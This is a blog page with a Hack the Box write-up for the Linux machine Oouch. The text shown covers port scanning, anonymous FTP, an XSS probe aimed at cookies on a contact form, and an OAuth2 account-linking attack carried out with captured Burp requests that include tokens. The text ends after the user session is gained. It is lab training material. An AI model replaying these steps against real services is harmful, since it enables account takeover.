<!DOCTYPE html><html lang="en-US" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Hack the Box - Oouch Writeup" /><meta property="og:locale" content="en_US" /><meta name="description" content="Zweilosec’s write-up on the hard-difficulty Linux machine Oouch from https://hackthebox.eu" /><meta property="og:description" content="Zweilosec’s write-up on the hard-difficulty Linux machine Oouch from https://hackthebox.eu" /><link rel="canonical" href="https://zweilosec.github.io/posts/oouch/" /><meta property="og:url" content="https://zweilosec.github.io/posts/oouch/" /><meta property="og:site_name" content="Hacker’s Rest" /><meta property="og:image" content="https://zweilosec.github.io/assets/img/1-oouch-infocard.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-06-11T14:00:00+00:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://zweilosec.github.io/assets/img/1-oouch-infocard.png" /><meta property="twitter:title" content="Hack the Box - Oouch Writeup" /><meta name="twitter:site" content="@zweilosec" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2021-05-03T22:47:36+00:00","datePublished":"2020-06-11T14:00:00+00:00","description":"Zweilosec’s write-up on the hard-difficulty Linux machine Oouch from https://hackthebox.eu","headline":"Hack the Box - Oouch Writeup","image":"https://zweilosec.github.io/assets/img/1-oouch-infocard.png","mainEntityOfPage":{"@type":"WebPage","@id":"https://zweilosec.github.io/posts/oouch/"},"url":"https://zweilosec.github.io/posts/oouch/"}</script><title>Hack the Box - Oouch Writeup | Hacker's Rest</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Hacker's Rest"><meta name="application-name" content="Hacker's Rest"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=UA-170504820-1"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'UA-170504820-1'); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/avatar/katana.gif" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Hacker's Rest</a></div><div class="site-subtitle font-italic">Notes documenting my journey to OSCP and beyond.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>PS C:\>WHOAMI</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/zweilosec" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/zweilosec" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['example','doamin.com'].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Hack the Box - Oouch Writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hack the Box - Oouch Writeup</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> zweilosec </span> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Thu, Jun 11, 2020, 2:00 PM +0000" prep="on" > Jun 11, 2020 <i class="unloaded">2020-06-11T14:00:00+00:00</i> </span></div><div> <span> <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Mon, May 3, 2021, 3:47 PM -0700" prefix="Updated " > May 3, 2021 <i class="unloaded">2021-05-03T22:47:36+00:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="4892 words">27 min</span></div><div><meta name="twitter:card" content="summary"><meta name="twitter:site" content="@zweilosec"></div></div><div class="post-content"><h2 id="htb---oouch">HTB - Oouch</h2><h2 id="overview">Overview</h2><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/1-oouch-infocard.png" alt="" /></p><p>This had difficulty Linux machine taught me a lot about the internal workings of a federated access control system, specifically an implementation of Oauth2. Persistence and the ability to take error messages and learn from them were necessary to progress through this machine.</p><h2 id="useful-skills-and-tools">Useful Skills and Tools</h2><h2 id="enumeration">Enumeration</h2><h3 id="nmap-scan">Nmap scan</h3><p>I started my enumeration with an nmap scan of <code class="language-plaintext highlighter-rouge">10.10.10.177</code>. The options I regularly use are:</p><div class="table-wrapper"><table><thead><tr><th style="text-align: left"><code class="language-plaintext highlighter-rouge">Flag</code><th style="text-align: left">Purpose<tbody><tr><td style="text-align: left"><code class="language-plaintext highlighter-rouge">-p-</code><td style="text-align: left">A shortcut which tells nmap to scan all ports<tr><td style="text-align: left"><code class="language-plaintext highlighter-rouge">-vvv</code><td style="text-align: left">Gives very verbose output so I can see the results as they are found, and also includes some information not normally shown<tr><td style="text-align: left"><code class="language-plaintext highlighter-rouge">-sC</code><td style="text-align: left">Equivalent to <code class="language-plaintext highlighter-rouge">--script=default</code> and runs a collection of nmap enumeration scripts against the target<tr><td style="text-align: left"><code class="language-plaintext highlighter-rouge">-sV</code><td style="text-align: left">Does a service version scan<tr><td style="text-align: left"><code class="language-plaintext highlighter-rouge">-oA $name</code><td style="text-align: left">Saves all three formats (standard, greppable, and XML) of output with a filename of <code class="language-plaintext highlighter-rouge">$name</code></table></div><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
</pre><td class="rouge-code"><pre>zweilos@kalimaa:~/htb/oouch<span class="nv">$ </span>nmap <span class="nt">-p-</span> <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-oA</span> oouch 10.10.10.177
Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-06-09 14:10 EDT
WARNING: Service 10.10.10.177:8000 had already soft-matched rtsp, but now soft-matched sip<span class="p">;</span> ignoring second value
Nmap scan report <span class="k">for </span>10.10.10.177

PORT      STATE    SERVICE VERSION
21/tcp    open     ftp     vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
|_-rw-r--r--    1 ftp      ftp            49 Feb 11 19:34 project.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.81
|      Logged <span class="k">in </span>as ftp                                                                                
|      TYPE: ASCII                                                                                     
|      Session bandwidth limit <span class="k">in </span>byte/s is 30000                                                      
|      Session <span class="nb">timeout </span><span class="k">in </span>seconds is 300                                                               
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp    open     ssh     OpenSSH 7.9p1 Debian 10+deb10u2 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 8d:6b:a7:2b:7a:21:9f:21:11:37:11:ed:50:4f:c6:1e <span class="o">(</span>RSA<span class="o">)</span>
|_  256 d2:af:55:5c:06:0b:60:db:9c:78:47:b5:ca:f4:f1:04 <span class="o">(</span>ED25519<span class="o">)</span>
5000/tcp  open     http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
| http-title: Welcome to Oouch
|_Requested resource was http://10.10.10.177:5000/login?next<span class="o">=</span>%2F
5643/tcp  filtered unknown
8000/tcp  open     rtsp
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest, HTTPOptions: 
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/html
|     Vary: Authorization
|     &lt;h1&gt;Bad Request <span class="o">(</span>400<span class="o">)</span>&lt;/h1&gt;
|   RTSPRequest: 
|     RTSP/1.0 400 Bad Request
|     Content-Type: text/html
|     Vary: Authorization
|     &lt;h1&gt;Bad Request <span class="o">(</span>400<span class="o">)</span>&lt;/h1&gt;
|   SIPOptions: 
|     SIP/2.0 400 Bad Request
|     Content-Type: text/html
|     Vary: Authorization
|_    &lt;h1&gt;Bad Request <span class="o">(</span>400<span class="o">)</span>&lt;/h1&gt;
|_http-title: Site doesn<span class="s1">'t have a title (text/html).
|_rtsp-methods: ERROR: Script execution failed (use -d to debug)
24079/tcp filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 2390.62 seconds
</span></pre></table></code></div></div><h4 id="anonymous-ftp">Anonymous FTP</h4><p>When doing my initial reconnaissance, I prefer to test for anonymous access to remote access and file sharing services such as ftp, telnet, and SMB before tacking more time and resource intensive services. In this case since port 21 was open, my first step was to login to FTP as <code class="language-plaintext highlighter-rouge">anonymous</code>.</p><div class="language-http highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre><span class="err">zweilos@kalimaa:~/htb/oouch$ ftp 10.10.10.177

Connected to 10.10.10.177. 
220 qtc's development server 
Name (10.10.10.177:zweilos): anonymous 
230 Login successful.    
Remote system type is UNIX. 
Using binary mode to transfer files.

ftp&gt; ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp            49 Feb 11 19:34 project.txt
226 Directory send OK.
ftp&gt; get project.txt
local: project.txt remote: project.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for project.txt (49 bytes).
226 Transfer complete.
49 bytes received in 0.00 secs (314.8129 kB/s)
ftp&gt; cd ..
250 Directory successfully changed.
ftp&gt; ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp            49 Feb 11 19:34 project.txt
226 Directory send OK.
ftp&gt; quit
221 Goodbye.
</span></pre></table></code></div></div><p>There was only one file, <code class="language-plaintext highlighter-rouge">project.txt</code> on the server, and I couldn’t navigate anywhere else.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>zweilos@kalimaa:~/htb/oouch$ cat project.txt
Flask -&gt; Consumer
Django -&gt; Authorization Server
</pre></table></code></div></div><p>The contents of the file revealed that <code class="language-plaintext highlighter-rouge">Flask</code> and <code class="language-plaintext highlighter-rouge">Django</code> were the two types of frameworks for the different services on some project. Doing a bit of quick reading revealed that <a href="https://flask.palletsprojects.com/">Flask</a> and <a href="https://www.djangoproject.com/">Django</a> are python-based frameworks for building web apps.</p><p>Next I checked SSH, but it did not allow me to connect without a private key <em>(I did note that there is no password required though)</em>.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>zweilos@kalimaa:~/htb/oouch$ ssh 10.10.10.177
zweilos@10.10.10.177: Permission denied (publickey).
</pre></table></code></div></div><h3 id="website-on-port-5000">Website on port 5000</h3><p>The next open port on my list was 5000. This is a non-standard port and could have been anything, but Nmap reported that there was an Nginx server hosting an HTTP server there, so I fired up my browser to check it out. Navigating to <code class="language-plaintext highlighter-rouge">http://10.10.10.177:5000</code> led to a pretty bare-bones login page.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/screenshot_2020-06-09_15-36-13.png" alt="" /></p><h2 id="initial-foothold">Initial Foothold</h2><p>First, I tested a few common default logins such as ‘admin:admin’ but that didn’t get me anywhere. From there I went to the <code class="language-plaintext highlighter-rouge">Register</code> page, created an account, logged in, and started looking around the site.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/Screenshot_2020-06-09_15-38-03.png" alt="" /></p><p>There was not much to do on most of the internal pages, though there was an interesting “send a message to the administrator” type input box on the <code class="language-plaintext highlighter-rouge">/contact</code> page.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/screenshot_2020-06-09_15-41-13.png" alt="" /></p><p>Attempting to check for XSS on the contact page using <code class="language-plaintext highlighter-rouge">javascript:alert(document.cookie)</code> resulted in: <code class="language-plaintext highlighter-rouge">"Hacking Attempt Detected"</code> and a one minute IP ban (see screenshot below). Sending the word ‘JavaScript’ was fine…but sending just the word ‘alert’ also triggered this message…I decided there must be some sort of filter, WAF, or IPS.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/screenshot_2020-06-09_16-04-27.png" alt="" /></p><p>Next I used Gobuster to search for more accessible directories and found an <code class="language-plaintext highlighter-rouge">/oauth</code> page. <code class="language-plaintext highlighter-rouge">http://10.10.10.177:5000/oauth</code> led to a “hidden” page with the following links:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/screenshot_2020-06-10_10-17-42.png" alt="" /></p><blockquote><ul><li>In order to connect your account:<code class="language-plaintext highlighter-rouge">http://consumer.oouch.htb:5000/oauth/connect</code><li>Once your account is connected, login here:<code class="language-plaintext highlighter-rouge">http://consumer.oouch.htb:5000/oauth/login</code></ul></blockquote><h3 id="website-on-port-8000">Website on port 8000</h3><p>After clicking the <code class="language-plaintext highlighter-rouge">/connect</code> link, I was redirected to <code class="language-plaintext highlighter-rouge">http://authorization.oouch.htb:8000/login/</code>. I added each of the newly found domains to my <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file so I could proceed.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>10.10.10.177    oouch.htb
10.10.10.177    consumer.oouch.htb
10.10.10.177    authorization.oouch.htb
</pre></table></code></div></div><p>I didn’t have any credentials that worked for the authorization site, so I began poking around to see if there was a way to register. The register link was at the root at <code class="language-plaintext highlighter-rouge">http://authorization.oouch.htb:8000/</code>.</p><h3 id="the-oauth2-server">The Oauth2 server</h3><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/screenshot_2020-06-10_11-16-23.png" alt="" /></p><p>I found these sites to be useful while doing research on the Oauth2 protocol:</p><blockquote><ul><li><a href="https://dhavalkapil.com/blogs/Attacking-the-OAuth-Protocol/">https://dhavalkapil.com/blogs/Attacking-the-OAuth-Protocol/</a><li><a href="https://aaronparecki.com/oauth-2-simplified/">https://aaronparecki.com/oauth-2-simplified/</a><li><a href="https://tools.ietf.org/html/rfc6749">RFC 6749: The OAuth 2.0 Authorization Framework</a></ul></blockquote><p>After creating an account and logging in, I was greeted with two API links <code class="language-plaintext highlighter-rouge">/oauth/get_user</code> and <code class="language-plaintext highlighter-rouge">/oauth/token</code>.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/screenshot_2020-06-13_07-09-34.png" alt="" /></p><p>The two links didn’t seem to do anything yet (according to my research I needed a higher privilege authorization token). I needed a way to get this token from a higher privilege user, and the only thing I could think of that I had found related to a site admin was the <code class="language-plaintext highlighter-rouge">/contact</code> page on the port 5000 site. Since the <code class="language-plaintext highlighter-rouge">/oauth</code> page had a method labeled “connect”, I figured the path forward must involve using oauth2 to link my account to the admin account.</p><p>After a lot of trial and error and lots of reading of the Oath2 documentation I figured out how to pause the authorization process to connect two accounts in the middle just before the final step. This makes it so the account is in a state where you have an authorization to connect token that is supposed to be sent to the authorized service to connect to. Since this token is sent in the URL, it is trivial to send it as a link to other people in order to link my account to one of my choice.</p><p>In order to exploit this, I first went back to original account on <code class="language-plaintext highlighter-rouge">http://consumer.oouch.htb:5000/</code> to use the <code class="language-plaintext highlighter-rouge">/connect</code> link on the <code class="language-plaintext highlighter-rouge">/oauth</code> page to authorize my two accounts to connect (the one on the consumer page on port 5000 and the Oauth2 internal account on port 8000).</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/oouch8.png" alt="" /></p><p>Using Burp to intercept all browser requests, I allowed each of the requests to pass until got to the button to authorize the connect. I then clicked the button, allowed the POST to the server in Burp,</p><div class="language-http highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="nf">POST</span> <span class="nn">/oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&amp;response_type=code&amp;redirect_uri=http://consumer.oouch.htb:5000/oauth/connect/token&amp;scope=read</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">authorization.oouch.htb:8000</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Referer</span><span class="p">:</span> <span class="s">http://authorization.oouch.htb:8000/oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&amp;response_type=code&amp;redirect_uri=http://consumer.oouch.htb:5000/oauth/connect/token&amp;scope=read</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">266</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">csrftoken=NfJT07Vec0wl4nbyaopTMl0qYHv5UAXMiJeIrn1yEi61fv4tv76sl9p0tJeWv4SX; sessionid=7sfqfco25nztiemxl9cdahojkewxw2xj</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
<span class="na">DNT</span><span class="p">:</span> <span class="s">1</span>

csrfmiddlewaretoken=ZNU3fziGduXycKscNjozBj8EY2TLhuRYei3lxLEWB80XoWZSBdn8SXVIb4zZb7G0&amp;redirect_uri=http%3A%2F%2Fconsumer.oouch.htb%3A5000%2Foauth%2Fconnect%2Ftoken&amp;scope=read&amp;client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&amp;state=&amp;response_type=code&amp;allow=Authorize
</pre></table></code></div></div><p>…then intercepted the GET request that contained the authorization link, and dropped the request in Burp so it wouldn’t authorize the two accounts to be linked. I needed to start the authorization process in order to get that link I could use to get any other account to connect to mine.</p><div class="language-http highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="nf">GET</span> <span class="nn">/oauth/connect/token?code=OcnuHPMmp4x0UcGjI9Tp87tnvxdfI6</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">consumer.oouch.htb:5000</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Referer</span><span class="p">:</span> <span class="s">http://authorization.oouch.htb:8000/oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&amp;response_type=code&amp;redirect_uri=http://consumer.oouch.htb:5000/oauth/connect/token&amp;scope=read</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">session=.eJwlT7tuwzAM_BVHcwaJkqjIn9EOHYogoCgyMeLYgGVPQf69AjodDvfA3dvcdKb2kGbG37cZ9g7mJa3RXczZfMl9avtG-7Quw_fB3BU95tPwIzOvLxmeNC0nc_1cz71ok_Yw474d0tlUzWgIgAQROWMK9oI5CWoIwNmjEla2TmJ16InRW2V7UUfAnBLGnkAbE_oi6h0HT6VycS6iBQdETn3MzByxQqICLlmpQTS4AAqhez31C9w2ve3rU5a-B4pjqVI1-hSiiI25BE5UMyUINqAApT6q544m2_8JNJ8_--NYTw.XuEzuA.FcBkilyEHZbTXL3aPtl9PU66Kmk</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
<span class="na">DNT</span><span class="p">:</span> <span class="s">1</span>
</pre></table></code></div></div><h2 id="road-to-user">Road to User</h2><h3 id="server-side-request-forgery-ssrf">Server-side Request Forgery (SSRF)</h3><p>Next, I needed to get the admin to link his account to mine in order to escalate my privileges. I went back to the <code class="language-plaintext highlighter-rouge">http://consumer.oouch.htb:5000/contact</code> page, and sent the admin the link with my authorization token request link, which was already activated through the POST message earlier. All I needed was for the admin to click the link to connect our accounts. This was an example of an attack called <a href="https://owasp.org/www-community/attacks/Server_Side_Request_Forgery">Server-side Request Forgery (SSRF)</a>.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/oouch13.png" alt="" /></p><p>I sent the following link to the admin, and hoped that there was some way that they would click it: <code class="language-plaintext highlighter-rouge">http://consumer.oouch.htb:5000/oauth/connect/token?code=4GCuHQ0LTjKkezQmz2jlolgHxfLXbc</code> <em>(copied from the url bar after Burp dropped the <code class="language-plaintext highlighter-rouge">GET</code> earlier).</em></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/oouch10.png" alt="" /></p><p>After getting a message thanking me for my feedback to the admin, I used the link <code class="language-plaintext highlighter-rouge">http://consumer.oouch.htb:5000/oauth/login</code> from the <code class="language-plaintext highlighter-rouge">/oauth</code> page to authorize the account connection.</p><blockquote><p>Note: You have to log in fast otherwise the token expires!</p></blockquote><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/screenshot_2020-06-10_15-42-54.png" alt="" /></p><p>The <code class="language-plaintext highlighter-rouge">/profile</code> page now showed was logged in as the user <code class="language-plaintext highlighter-rouge">qtc</code> with my oauth2 account linked to it.</p><h3 id="finding-the-developer-creds">Finding the developer creds</h3><p>I noticed on the <code class="language-plaintext highlighter-rouge">/documents</code> page I now had the following items 